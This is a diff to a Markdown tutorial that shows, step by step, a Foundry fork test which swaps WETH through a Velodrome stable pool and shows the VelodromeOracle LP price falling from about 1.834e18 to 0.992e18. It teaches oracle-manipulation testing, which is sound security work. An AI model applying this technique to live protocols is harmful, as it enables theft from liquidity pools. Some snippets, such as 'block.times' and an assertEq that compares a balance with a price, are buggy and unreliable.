@@ -255,7 +255,7 @@ However, there is a trick way using `WETH.balanceOf(STABLE_PAIR)` to obtain the 
    ```
 4. Approve transfer
    ```solidity
-       WETH.approve(STABLE_PAIR, initialBalanceOfWETH); // Authorizing the `STABLE_PAIR` contract to transfer up to an `initialBalanceOfWETH` amount of WETH tokens from the `ATTACKER` account.
+       WETH.approve(address(VELO_ROUTER), initialBalanceOfWETH); // Authorizing the `VELO_ROUTER` contract to transfer up to an `initialBalanceOfWETH` amount of WETH tokens from the `ATTACKER` account.
    ```
 5. Calling the Swap function on the Velodrome Finance: Router,so create the interface IRouter in your test file.
    
@@ -314,16 +314,78 @@ However, there is a trick way using `WETH.balanceOf(STABLE_PAIR)` to obtain the 
       }
    ```
 7. Using `swapExactTokensForTokens` in your test file.
+ 
    ```solidity
+       VELO_ROUTER.swapExactTokensForTokens(amountIn, amountOutMin, routes, to, deadline)
    ```
+
+   There are five parameters: `amountIn`, `amountOutMin`, `routes`, `to`, `deadline`
+
+   - `amountIn`: `initialBalanceOfWETH`
+   - `amountOutMin`: `1`
+   - `to`: `address(ATTACKER)`
+   - `deadline`: `block.timestamp`
+   - `routes`
+   
+   Setting up a route for a token swap operation. It involves sepcifying the path a token swap should take, including the source and destination tokens, and whether the swap should occur through a stable or volatile liquidity pool.
+   Because the function `swapExactTokensForTokens` use an array `routes` of type `route` as its third parameter, we need to use an array of length 1.
+   
+   ```solidity
+        /**
+        struct route {
+            address from;
+            address to;
+            bool stable;
+        }
+        */
+        IRouter.route[] memory r = new IRouter.route[](1);
+        IRouter.route memory the_route = IRouter.route({
+            from: address(WETH),
+            to: address(WSTETH),
+            stable: true
+        });
+
+        r[0] = the_route;
+        VELO_ROUTER.swapExactTokensForTokens(initialBalanceOfWETH, 1, r, address(ATTACKER), block.times)
+   ```
+
 #### 4. Verify if Price Changes
+1. After `swapExactTokensForTokens`, use `get_lp_price` to obtain the latest LP price, and use `assertEq` to determine whether the price has changed.
+   
+   ```solidity
+        // 4. Verify if Price Changes
+        uint256 newPrice =  oracle.get_lp_price(STABLE_PAIR,prices);
+        assertEq(initialBalanceOfWETH, newPrice, "Different");
+   ```
+2. Using `console2.log` to print price in the console. 
+
+   ```solidity
+       import "forge-std/console2.sol";
+       ......
+               uint256 initialPrice = oracle.get_lp_price(STABLE_PAIR,prices);
+               console2.log("initialPrice: ", initialPrice);
+       ......
+               // 4. Verify if Price Changes
+               uint256 newPrice =  oracle.get_lp_price(STABLE_PAIR,prices);
+               console2.log("newPrice: ", newPrice);
+               assertEq(initialBalanceOfWETH, newPrice, "Different");
+
+   ```
+##### 5. Test Result
+The test results indicate a significant change in the liquidity pool price reported by the `VelodromeOracle` contract after simulating an attack, with the initial price at approximately `1.834e18` and the new price dropping to about `0.992e18` post-attack. This discrepancy highlights a potential vulnerability in the contract's price feedback mechanism, especially under extreme market conditions or manipulative actions.
+
+![result](images/result.png)
 
 
-
-## Tricks
+## Tips
 
 - Using balance of LP token to approximate the pool's reserves
 
 - Use [Solidity by Example](https://solidity-by-example.org/) to assist in writing test code 
 
+- Use `-vvv` to check the detail of test, if there are some error.
+  ```
+      forge test --rpc-url https://opt-mainnet.g.alchemy.com/v2/YOUR_API -vvv
+  ```
+## Thanks
 Case From: [Foundry for Blazing Fast Brute Forcing](https://youtu.be/tDFA8cnHoCY?t=8063)
